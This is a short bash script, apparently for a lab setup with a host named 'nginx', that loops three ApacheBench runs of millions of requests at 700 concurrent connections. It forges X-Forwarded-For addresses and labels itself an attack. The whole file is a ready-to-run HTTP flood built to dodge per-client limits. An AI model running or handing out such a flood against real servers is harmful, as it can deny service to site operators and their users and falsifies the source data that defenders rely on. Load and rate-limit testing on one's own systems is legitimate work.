#!/bin/bash

trap 'echo Attack Stopped; exit' INT

IP=nginx
PORT=80
URI='/'
NUM=5000000
CONNS=700
while true; do
ab -r -n ${NUM} -c ${CONNS} -d -s 120 \
-H "X-Forwarded-For: 1.1.1.1" \
http://${IP}:${PORT}/${URI} &

ab -r -n ${NUM} -c ${CONNS} -d -s 120 \
-H "X-Forwarded-For: 1.1.1.2" \
http://${IP}:${PORT}/${URI} &

ab -r -n ${NUM} -c ${CONNS} -d -s 120 \
-H "X-Forwarded-For: 1.1.1.3" \
http://${IP}:${PORT}/${URI}


done